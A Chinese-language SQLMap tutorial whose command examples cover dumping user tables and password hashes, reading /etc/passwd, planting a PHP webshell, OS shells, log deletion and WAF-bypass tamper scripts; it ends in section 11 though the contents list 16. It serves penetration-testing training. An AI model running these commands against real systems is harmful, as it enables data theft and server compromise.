

> SQLMap 是一款开源的自动化 SQL 注入检测和利用工具
> 本笔记涵盖从入门到高级的完整 SQLMap 使用指南
> 基于 SQLMap 1.8+ 版本，更新日期：2025年12月

---

## 目录

1. [SQLMap 简介](#1-sqlmap-简介)
2. [安装与配置](#2-安装与配置)
3. [基础使用](#3-基础使用)
4. [目标指定方式](#4-目标指定方式)
5. [请求配置](#5-请求配置)
6. [注入检测](#6-注入检测)
7. [注入技术详解](#7-注入技术详解)
8. [数据库枚举](#8-数据库枚举)
9. [数据提取](#9-数据提取)
10. [高级利用技术](#10-高级利用技术)
11. [绕过技术](#11-绕过技术)
12. [操作系统交互](#12-操作系统交互)
13. [自动化与批量测试](#13-自动化与批量测试)
14. [实战案例](#14-实战案例)
15. [常见错误与解决方案](#15-常见错误与解决方案)
16. [最佳实践与技巧](#16-最佳实践与技巧)

---

## 1. SQLMap 简介

### 1.1 什么是 SQLMap？

SQLMap 是一款功能强大的开源渗透测试工具，专门用于自动化检测和利用 SQL 注入漏洞。它由 Bernardo Damele 和 Miroslav Stampar 开发维护，是安全研究人员和渗透测试人员的必备工具。

简单来说，SQLMap 可以帮助你：
- 自动检测网站是否存在 SQL 注入漏洞
- 识别后端数据库类型（MySQL、Oracle、PostgreSQL 等）
- 提取数据库中的数据（用户名、密码、敏感信息）
- 在某些情况下获取服务器的 Shell 访问权限

```
┌─────────────────────────────────────────────────────────────────┐
│                    SQLMap 工作流程                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 目标识别                                                   │
│      └── 分析 URL、参数、请求方式                               │
│                                                                 │
│   2. 注入检测                                                   │
│      └── 测试各种注入技术（布尔、时间、联合等）                 │
│                                                                 │
│   3. 数据库指纹识别                                             │
│      └── 确定数据库类型和版本                                   │
│                                                                 │
│   4. 数据提取                                                   │
│      └── 枚举数据库、表、列、数据                               │
│                                                                 │
│   5. 高级利用                                                   │
│      └── 文件读写、命令执行、提权                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 支持的数据库

SQLMap 支持几乎所有主流数据库管理系统：

| 数据库 | 完整支持 | 部分支持 |
|--------|----------|----------|
| MySQL | ✓ | - |
| Oracle | ✓ | - |
| PostgreSQL | ✓ | - |
| Microsoft SQL Server | ✓ | - |
| SQLite | ✓ | - |
| MariaDB | ✓ | - |
| IBM DB2 | ✓ | - |
| Microsoft Access | ✓ | - |
| Firebird | ✓ | - |
| Sybase | ✓ | - |
| SAP MaxDB | ✓ | - |
| Informix | ✓ | - |
| HSQLDB | ✓ | - |
| H2 | ✓ | - |
| MonetDB | - | ✓ |
| Apache Derby | - | ✓ |
| Amazon Redshift | - | ✓ |
| Vertica | - | ✓ |
| Mckoi | - | ✓ |
| Presto | - | ✓ |
| Altibase | - | ✓ |
| MimerSQL | - | ✓ |
| CrateDB | - | ✓ |
| Greenplum | - | ✓ |
| Drizzle | - | ✓ |
| Apache Ignite | - | ✓ |
| Cubrid | - | ✓ |
| InterSystems Cache | - | ✓ |
| IRIS | - | ✓ |
| eXtremeDB | - | ✓ |
| FrontBase | - | ✓ |

### 1.3 支持的注入技术

SQLMap 支持六种 SQL 注入技术：

```
┌─────────────────────────────────────────────────────────────────┐
│                    SQL 注入技术类型                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   B - Boolean-based blind (布尔盲注)                            │
│       通过页面返回内容的真假来判断                              │
│       例：id=1 AND 1=1 (真) vs id=1 AND 1=2 (假)               │
│                                                                 │
│   E - Error-based (报错注入)                                    │
│       通过数据库报错信息获取数据                                │
│       例：extractvalue(1,concat(0x7e,version()))               │
│                                                                 │
│   U - Union query-based (联合查询注入)                          │
│       通过 UNION 语句合并查询结果                               │
│       例：id=1 UNION SELECT 1,2,version()                      │
│                                                                 │
│   S - Stacked queries (堆叠查询)                                │
│       执行多条 SQL 语句                                         │
│       例：id=1; DROP TABLE users;--                            │
│                                                                 │
│   T - Time-based blind (时间盲注)                               │
│       通过响应时间差异判断                                      │
│       例：id=1 AND SLEEP(5)                                    │
│                                                                 │
│   Q - Inline queries (内联查询)                                 │
│       在查询中嵌套子查询                                        │
│       例：id=(SELECT password FROM users LIMIT 1)              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. 安装与配置

### 2.1 安装方法

#### 2.1.1 Kali Linux（预装）

Kali Linux 已经预装了 SQLMap，可以直接使用：

```bash
# 检查版本
sqlmap --version

# 更新到最新版本
sudo apt update
sudo apt install sqlmap
```

#### 2.1.2 从 GitHub 安装（推荐）

```bash
# 克隆仓库
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# 进入目录
cd sqlmap-dev

# 运行
python sqlmap.py --version

# 更新
git pull
```

#### 2.1.3 使用 pip 安装

```bash
pip install sqlmap
```

#### 2.1.4 Windows 安装

```powershell
# 1. 安装 Python 3.x
# 2. 下载 SQLMap
git clone https://github.com/sqlmapproject/sqlmap.git

# 3. 运行
python sqlmap.py --version
```

### 2.2 配置文件

SQLMap 的配置文件位于 `~/.sqlmap/sqlmap.conf`（首次运行后自动创建）。

```ini
# sqlmap.conf 示例配置

[Target]
# 默认目标 URL
url = 

[Request]
# 默认 User-Agent
agent = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
# 默认超时时间
timeout = 30
# 默认重试次数
retries = 3

[Optimization]
# 默认线程数
threads = 1

[Detection]
# 默认检测级别
level = 1
# 默认风险级别
risk = 1
```

### 2.3 目录结构

```
~/.sqlmap/
├── sqlmap.conf          # 配置文件
├── output/              # 输出目录
│   └── target.com/      # 按目标分类
│       ├── log          # 日志文件
│       ├── session.sqlite  # 会话数据
│       └── dump/        # 导出的数据
├── history/             # 命令历史
└── plugins/             # 自定义插件
```

---

## 3. 基础使用

### 3.1 最简单的用法

SQLMap 最基本的用法就是指定一个带有参数的 URL：

```bash
# 基础用法
sqlmap -u "http://target.com/page.php?id=1"

# 参数说明：
# -u: 指定目标 URL
# ?id=1: 要测试的参数
```

当你运行这个命令时，SQLMap 会：
1. 分析 URL 中的参数
2. 自动测试 `id` 参数是否存在 SQL 注入
3. 如果存在漏洞，识别数据库类型
4. 询问你是否继续深入测试

### 3.2 常用基础参数

```bash
# 指定要测试的参数
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# 自动回答所有问题为 Yes
sqlmap -u "http://target.com/page.php?id=1" --batch

# 显示详细输出
sqlmap -u "http://target.com/page.php?id=1" -v 3

# 指定数据库类型（加快测试速度）
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# 组合使用
sqlmap -u "http://target.com/page.php?id=1" --batch --dbms=mysql -v 2
```

### 3.3 输出详细级别

SQLMap 提供了 7 个详细级别（0-6）：

| 级别 | 说明 |
|------|------|
| 0 | 只显示 Python 错误和关键信息 |
| 1 | 显示信息和警告（默认） |
| 2 | 显示调试信息 |
| 3 | 显示注入的 Payload |
| 4 | 显示 HTTP 请求 |
| 5 | 显示 HTTP 响应头 |
| 6 | 显示 HTTP 响应内容 |

```bash
# 查看发送的 Payload
sqlmap -u "http://target.com/page.php?id=1" -v 3

# 查看完整的 HTTP 请求和响应
sqlmap -u "http://target.com/page.php?id=1" -v 6
```

---

## 4. 目标指定方式

SQLMap 提供了多种指定目标的方式，适应不同的测试场景。

### 4.1 直接 URL

```bash
# GET 请求
sqlmap -u "http://target.com/page.php?id=1"

# 多个参数
sqlmap -u "http://target.com/page.php?id=1&name=test&page=2"

# 指定测试特定参数
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# 测试多个参数
sqlmap -u "http://target.com/page.php?id=1&name=test" -p "id,name"

# 使用星号标记注入点
sqlmap -u "http://target.com/page.php?id=1*&name=test"
```

### 4.2 POST 请求

```bash
# 使用 --data 指定 POST 数据
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123"

# 指定测试的参数
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" -p username

# 使用星号标记注入点
sqlmap -u "http://target.com/login.php" --data="username=admin*&password=123"
```

### 4.3 从文件读取请求

这是最推荐的方式，特别是对于复杂的请求。你可以使用 Burp Suite 捕获请求并保存到文件。

```bash
# 从文件读取请求
sqlmap -r request.txt

# request.txt 内容示例：
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123
Content-Length: 30

username=admin&password=123
```

```bash
# 使用星号标记注入点
# request.txt 内容：
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin*&password=123
```

### 4.4 从 Burp/WebScarab 日志读取

```bash
# 从 Burp Suite 日志读取
sqlmap -l burp_log.txt

# 从 WebScarab 日志读取
sqlmap -l webscarab_log.txt
```

### 4.5 从 Sitemap 读取

```bash
# 从 sitemap.xml 读取目标
sqlmap -x "http://target.com/sitemap.xml"
```

### 4.6 Google Dork

```bash
# 使用 Google Dork 搜索目标
sqlmap -g "inurl:page.php?id="

# 指定搜索结果数量
sqlmap -g "inurl:page.php?id=" --gpage=2
```

### 4.7 批量测试

```bash
# 从文件读取多个 URL
sqlmap -m urls.txt

# urls.txt 内容：
# http://target1.com/page.php?id=1
# http://target2.com/news.php?id=2
# http://target3.com/article.php?id=3
```

### 4.8 配置文件

```bash
# 使用配置文件
sqlmap -c sqlmap.conf

# sqlmap.conf 内容示例：
[Target]
url = http://target.com/page.php?id=1

[Request]
cookie = PHPSESSID=abc123
agent = Mozilla/5.0

[Enumeration]
dbs = True
```

---

## 5. 请求配置

### 5.1 HTTP 方法

```bash
# 指定 HTTP 方法
sqlmap -u "http://target.com/api/user" --method=PUT --data='{"id":1}'

# 常用方法
--method=GET
--method=POST
--method=PUT
--method=DELETE
--method=PATCH
```

### 5.2 Cookie 设置

```bash
# 设置 Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123; user=admin"

# 从文件加载 Cookie
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# 测试 Cookie 中的参数
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2

# 自动处理 Set-Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --drop-set-cookie
```

### 5.3 User-Agent 设置

```bash
# 指定 User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# 使用随机 User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# 模拟移动设备
sqlmap -u "http://target.com/page.php?id=1" --mobile
```

### 5.4 HTTP 头设置

```bash
# 添加自定义头
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nX-Custom: value"

# 设置 Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"

# 测试 HTTP 头中的注入点（需要 level >= 3）
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 1*" --level=3
```

### 5.5 认证设置

```bash
# HTTP Basic 认证
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="admin:password"

# HTTP Digest 认证
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="admin:password"

# NTLM 认证
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\admin:password"

# 证书认证
sqlmap -u "https://target.com/page.php?id=1" --auth-file=cert.pem
```

### 5.6 代理设置

```bash
# 使用 HTTP 代理
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# 使用 SOCKS 代理
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:1080"

# 代理认证
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"

# 使用 Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor

# 从文件加载代理列表
sqlmap -u "http://target.com/page.php?id=1" --proxy-file=proxies.txt
```

### 5.7 超时与重试

```bash
# 设置超时时间（秒）
sqlmap -u "http://target.com/page.php?id=1" --timeout=30

# 设置重试次数
sqlmap -u "http://target.com/page.php?id=1" --retries=5

# 设置延迟（秒）- 避免被封
sqlmap -u "http://target.com/page.php?id=1" --delay=1

# 设置安全 URL（定期访问以保持会话）
sqlmap -u "http://target.com/page.php?id=1" --safe-url="http://target.com/index.php" --safe-freq=10
```

### 5.8 SSL/TLS 设置

```bash
# 忽略 SSL 证书错误
sqlmap -u "https://target.com/page.php?id=1" --force-ssl

# 指定 SSL 版本
sqlmap -u "https://target.com/page.php?id=1" --ssl-version=TLSv1.2
```

---

## 6. 注入检测

### 6.1 检测级别（Level）

Level 参数控制测试的深度和广度，范围是 1-5：

```bash
# 默认级别 1
sqlmap -u "http://target.com/page.php?id=1" --level=1

# 最高级别 5
sqlmap -u "http://target.com/page.php?id=1" --level=5
```

| Level | 测试内容 |
|-------|----------|
| 1 | 默认，测试 GET 和 POST 参数 |
| 2 | 测试 Cookie 参数 |
| 3 | 测试 User-Agent 和 Referer 头 |
| 4 | 测试更多 HTTP 头 |
| 5 | 测试 Host 头，使用更多 Payload |

```bash
# 测试 Cookie 注入
sqlmap -u "http://target.com/page.php" --cookie="id=1" --level=2

# 测试 User-Agent 注入
sqlmap -u "http://target.com/page.php?id=1" --level=3

# 测试所有可能的注入点
sqlmap -u "http://target.com/page.php?id=1" --level=5
```

### 6.2 风险级别（Risk）

Risk 参数控制测试的风险程度，范围是 1-3：

```bash
# 默认风险 1
sqlmap -u "http://target.com/page.php?id=1" --risk=1

# 最高风险 3
sqlmap -u "http://target.com/page.php?id=1" --risk=3
```

| Risk | 测试内容 |
|------|----------|
| 1 | 默认，使用无害的测试 |
| 2 | 添加基于时间的盲注测试 |
| 3 | 添加 OR 类型的测试（可能修改数据） |

> ⚠️ 警告：Risk 3 可能会修改数据库中的数据，请谨慎使用！

```bash
# 推荐的组合
sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2
```

### 6.3 指定注入技术

```bash
# 只使用特定技术
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# 技术代码：
# B - Boolean-based blind
# E - Error-based
# U - Union query-based
# S - Stacked queries
# T - Time-based blind
# Q - Inline queries

# 只使用联合查询
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# 只使用盲注
sqlmap -u "http://target.com/page.php?id=1" --technique=BT

# 排除时间盲注（更快）
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUQ
```

### 6.4 指定数据库类型

```bash
# 指定 MySQL
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# 指定 SQL Server
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql

# 指定 Oracle
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle

# 指定 PostgreSQL
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql

# 指定版本
sqlmap -u "http://target.com/page.php?id=1" --dbms="mysql 5.7"
```

### 6.5 前缀和后缀

有时候需要手动指定 Payload 的前缀和后缀来闭合语句：

```bash
# 指定前缀
sqlmap -u "http://target.com/page.php?id=1" --prefix="')"

# 指定后缀
sqlmap -u "http://target.com/page.php?id=1" --suffix="-- -"

# 组合使用
sqlmap -u "http://target.com/page.php?id=1" --prefix="')" --suffix="-- -"

# 示例场景：
# 原始查询：SELECT * FROM users WHERE id=('$id')
# 需要闭合：id=1') AND 1=1-- -
```

### 6.6 字符串匹配

```bash
# 指定真条件时页面包含的字符串
sqlmap -u "http://target.com/page.php?id=1" --string="Welcome"

# 指定假条件时页面包含的字符串
sqlmap -u "http://target.com/page.php?id=1" --not-string="Error"

# 使用正则表达式
sqlmap -u "http://target.com/page.php?id=1" --regexp="user.*admin"

# 指定响应码
sqlmap -u "http://target.com/page.php?id=1" --code=200
```

---

## 7. 注入技术详解

### 7.1 布尔盲注（Boolean-based Blind）

布尔盲注是最常见的注入类型之一。它通过观察页面返回内容的变化来判断条件是否为真。

```
原理说明：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   正常请求：id=1                                                │
│   返回：正常页面内容                                            │
│                                                                 │
│   注入测试：id=1 AND 1=1                                        │
│   返回：正常页面内容（条件为真）                                │
│                                                                 │
│   注入测试：id=1 AND 1=2                                        │
│   返回：异常页面或空白（条件为假）                              │
│                                                                 │
│   通过对比两次响应的差异，确认存在注入                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```bash
# 只使用布尔盲注
sqlmap -u "http://target.com/page.php?id=1" --technique=B

# 布尔盲注提取数据的过程（SQLMap 自动完成）：
# 1. id=1 AND (SELECT LENGTH(database()))>5  -> 真
# 2. id=1 AND (SELECT LENGTH(database()))>10 -> 假
# 3. id=1 AND (SELECT LENGTH(database()))>7  -> 真
# 4. id=1 AND (SELECT LENGTH(database()))>8  -> 假
# 5. 确定数据库名长度为 8
# 6. 逐字符猜解数据库名...
```

### 7.2 报错注入（Error-based）

报错注入利用数据库的错误信息来获取数据，速度快但需要目标显示错误信息。

```bash
# 只使用报错注入
sqlmap -u "http://target.com/page.php?id=1" --technique=E

# 常见的报错注入 Payload（MySQL）：
# extractvalue(1,concat(0x7e,(SELECT version()),0x7e))
# updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
# floor(rand(0)*2)

# 常见的报错注入 Payload（SQL Server）：
# convert(int,(SELECT @@version))
# cast((SELECT @@version) as int)
```

### 7.3 联合查询注入（Union-based）

联合查询注入是最高效的注入方式，可以一次性获取大量数据。

```bash
# 只使用联合查询注入
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# 指定 UNION 列数
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-cols=5

# 指定 UNION 字符
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-char=NULL

# 指定 UNION 表
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-from=users
```

```
联合查询注入原理：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   原始查询：                                                    │
│   SELECT id, name, email FROM users WHERE id = 1                │
│                                                                 │
│   注入后：                                                      │
│   SELECT id, name, email FROM users WHERE id = 1                │
│   UNION SELECT 1, version(), user()                             │
│                                                                 │
│   结果：                                                        │
│   | id | name    | email           |                            │
│   | 1  | admin   | admin@test.com  |                            │
│   | 1  | 5.7.32  | root@localhost  |  <- 注入的数据             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.4 堆叠查询（Stacked Queries）

堆叠查询允许执行多条 SQL 语句，可以进行数据修改、删除等操作。

```bash
# 只使用堆叠查询
sqlmap -u "http://target.com/page.php?id=1" --technique=S

# 堆叠查询示例：
# id=1; INSERT INTO users VALUES(999,'hacker','hacked')
# id=1; UPDATE users SET password='hacked' WHERE id=1
# id=1; DELETE FROM logs WHERE 1=1
```

> ⚠️ 警告：堆叠查询可能会修改或删除数据，请谨慎使用！

### 7.5 时间盲注（Time-based Blind）

时间盲注通过响应时间的差异来判断条件是否为真，是最慢但最可靠的注入方式。

```bash
# 只使用时间盲注
sqlmap -u "http://target.com/page.php?id=1" --technique=T

# 设置时间延迟（秒）
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5
```

```
时间盲注原理：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   注入测试：id=1 AND SLEEP(5)                                   │
│   如果响应时间 >= 5秒，说明 SLEEP 被执行，存在注入              │
│                                                                 │
│   数据提取：                                                    │
│   id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)        │
│   如果响应时间 >= 5秒，说明数据库名第一个字符是 'a'            │
│                                                                 │
│   不同数据库的延迟函数：                                        │
│   MySQL:      SLEEP(5), BENCHMARK(10000000,SHA1('test'))       │
│   SQL Server: WAITFOR DELAY '0:0:5'                            │
│   PostgreSQL: pg_sleep(5)                                      │
│   Oracle:     DBMS_LOCK.SLEEP(5)                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.6 内联查询（Inline Queries）

内联查询在查询中嵌套子查询，适用于特定场景。

```bash
# 只使用内联查询
sqlmap -u "http://target.com/page.php?id=1" --technique=Q

# 内联查询示例：
# id=(SELECT password FROM users WHERE username='admin')
```

---

## 8. 数据库枚举

### 8.1 获取基本信息

```bash
# 获取当前数据库名
sqlmap -u "http://target.com/page.php?id=1" --current-db

# 获取当前用户
sqlmap -u "http://target.com/page.php?id=1" --current-user

# 获取服务器主机名
sqlmap -u "http://target.com/page.php?id=1" --hostname

# 检查是否是 DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# 获取所有用户
sqlmap -u "http://target.com/page.php?id=1" --users

# 获取用户密码哈希
sqlmap -u "http://target.com/page.php?id=1" --passwords

# 获取用户权限
sqlmap -u "http://target.com/page.php?id=1" --privileges

# 获取用户角色
sqlmap -u "http://target.com/page.php?id=1" --roles

# 获取数据库版本
sqlmap -u "http://target.com/page.php?id=1" --banner

# 一次性获取所有基本信息
sqlmap -u "http://target.com/page.php?id=1" -b --current-user --current-db --is-dba
```

### 8.2 枚举数据库

```bash
# 列出所有数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 输出示例：
# [*] information_schema
# [*] mysql
# [*] performance_schema
# [*] target_db
```

### 8.3 枚举表

```bash
# 列出指定数据库的所有表
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables

# 输出示例：
# Database: target_db
# [4 tables]
# +----------+
# | users    |
# | orders   |
# | products |
# | logs     |
# +----------+

# 列出所有数据库的所有表
sqlmap -u "http://target.com/page.php?id=1" --tables
```

### 8.4 枚举列

```bash
# 列出指定表的所有列
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns

# 输出示例：
# Database: target_db
# Table: users
# [5 columns]
# +----------+-------------+
# | Column   | Type        |
# +----------+-------------+
# | id       | int(11)     |
# | username | varchar(50) |
# | password | varchar(255)|
# | email    | varchar(100)|
# | role     | varchar(20) |
# +----------+-------------+
```

### 8.5 统计信息

```bash
# 获取数据库条目数量
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --count

# 输出示例：
# Database: target_db
# Table: users
# [1000 entries]
```

### 8.6 搜索功能

```bash
# 搜索包含特定关键字的数据库
sqlmap -u "http://target.com/page.php?id=1" --search -D admin

# 搜索包含特定关键字的表
sqlmap -u "http://target.com/page.php?id=1" --search -T user

# 搜索包含特定关键字的列
sqlmap -u "http://target.com/page.php?id=1" --search -C password
```

---

## 9. 数据提取

### 9.1 导出数据

```bash
# 导出指定表的所有数据
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump

# 导出指定列的数据
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users -C username,password --dump

# 导出整个数据库
sqlmap -u "http://target.com/page.php?id=1" -D target_db --dump-all

# 导出所有数据库
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# 排除系统数据库
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### 9.2 限制导出范围

```bash
# 限制导出行数
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --start=1 --stop=10

# 使用 WHERE 条件
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --where="role='admin'"

# 只导出第一行
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --first=1

# 只导出最后一行
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --last=1
```

### 9.3 导出格式

```bash
# 导出为 CSV 格式（默认）
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --dump-format=CSV

# 导出为 HTML 格式
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --dump-format=HTML

# 导出为 SQLite 格式
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --dump-format=SQLITE

# 指定输出目录
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --output-dir=/tmp/sqlmap_output
```

### 9.4 密码破解

SQLMap 内置了密码破解功能，可以自动尝试破解获取到的密码哈希。

```bash
# 获取密码并自动破解
sqlmap -u "http://target.com/page.php?id=1" --passwords

# 使用自定义字典
sqlmap -u "http://target.com/page.php?id=1" --passwords --password-file=/usr/share/wordlists/rockyou.txt

# 导出数据时自动破解密码
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump
# SQLMap 会自动检测密码哈希并尝试破解
```

### 9.5 SQL Shell

```bash
# 获取 SQL Shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# 在 SQL Shell 中执行查询
sql-shell> SELECT * FROM users WHERE id=1
sql-shell> SELECT @@version
sql-shell> SHOW DATABASES

# 执行单条 SQL 语句
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT * FROM users"
```

---

## 10. 高级利用技术

### 10.1 文件读取

在某些情况下，SQLMap 可以读取服务器上的文件。这需要数据库用户具有文件读取权限。

```bash
# 读取文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# 读取 Windows 文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/win.ini"

# 读取 Web 配置文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

```
文件读取原理（MySQL）：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   MySQL 使用 LOAD_FILE() 函数读取文件：                         │
│   SELECT LOAD_FILE('/etc/passwd')                               │
│                                                                 │
│   前提条件：                                                    │
│   1. 数据库用户具有 FILE 权限                                   │
│   2. secure_file_priv 配置允许                                  │
│   3. 文件对 MySQL 进程可读                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 10.2 文件写入

```bash
# 写入文件
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 写入 WebShell
# 首先创建本地 shell.php 文件：
# <?php system($_GET['cmd']); ?>

sqlmap -u "http://target.com/page.php?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

```
文件写入原理（MySQL）：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   MySQL 使用 INTO OUTFILE 写入文件：                            │
│   SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE          │
│   '/var/www/html/shell.php'                                     │
│                                                                 │
│   前提条件：                                                    │
│   1. 数据库用户具有 FILE 权限                                   │
│   2. secure_file_priv 配置允许                                  │
│   3. 目标目录对 MySQL 进程可写                                  │
│   4. 目标文件不存在                                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 10.3 操作系统命令执行

```bash
# 获取操作系统 Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 执行单条命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# 获取 PowerShell（Windows）
sqlmap -u "http://target.com/page.php?id=1" --os-pwn
```

```
命令执行原理：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   MySQL (Linux):                                                │
│   1. 写入 UDF (User Defined Function) 库文件                    │
│   2. 创建自定义函数                                             │
│   3. 调用函数执行命令                                           │
│                                                                 │
│   MySQL (Windows):                                              │
│   1. 写入 UDF DLL 文件                                          │
│   2. 创建自定义函数                                             │
│   3. 调用函数执行命令                                           │
│                                                                 │
│   SQL Server:                                                   │
│   1. 启用 xp_cmdshell                                           │
│   2. 执行 EXEC xp_cmdshell 'command'                            │
│                                                                 │
│   PostgreSQL:                                                   │
│   1. 创建 PL/Python 函数                                        │
│   2. 调用函数执行命令                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 10.4 Meterpreter Shell

```bash
# 获取 Meterpreter Shell
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/usr/share/metasploit-framework

# 指定 Payload 类型
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --priv-esc
```

### 10.5 注册表操作（Windows）

```bash
# 读取注册表
sqlmap -u "http://target.com/page.php?id=1" --reg-read --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" --reg-value="ProductName"

# 写入注册表
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Test" --reg-value="TestValue" --reg-data="TestData" --reg-type=REG_SZ

# 删除注册表
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Test" --reg-value="TestValue"
```

### 10.6 数据库提权

```bash
# 尝试数据库提权
sqlmap -u "http://target.com/page.php?id=1" --priv-esc

# SQL Server 提权
# 如果当前用户是 db_owner，可以尝试提权到 sysadmin
```

---

## 11. 绕过技术

### 11.1 Tamper 脚本

Tamper 脚本用于修改 Payload 以绑过 WAF（Web 应用防火墙）和过滤器。

```bash
# 使用单个 Tamper 脚本
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# 使用多个 Tamper 脚本
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,between,randomcase"

# 查看所有可用的 Tamper 脚本
ls /usr/share/sqlmap/tamper/
```

### 11.2 常用 Tamper 脚本

| 脚本名称 | 功能 | 适用数据库 |
|----------|------|------------|
| `space2comment` | 空格替换为 `/**/` | 通用 |
| `space2plus` | 空格替换为 `+` | 通用 |
| `space2randomblank` | 空格替换为随机空白字符 | 通用 |
| `between` | `>` 替换为 `BETWEEN` | 通用 |
| `randomcase` | 随机大小写 | 通用 |
| `charencode` | URL 编码 | 通用 |
| `charunicodeencode` | Unicode 编码 | 通用 |
| `equaltolike` | `=` 替换为 `LIKE` | 通用 |
| `greatest` | `>` 替换为 `GREATEST` | MySQL |
| `ifnull2ifisnull` | `IFNULL` 替换为 `IF(ISNULL())` | MySQL |
| `modsecurityversioned` | 绕过 ModSecurity | MySQL |
| `modsecurityzeroversioned` | 绕过 ModSecurity | MySQL |
| `multiplespaces` | 多个空格 | 通用 |
| `percentage` | 添加百分号 | ASP |
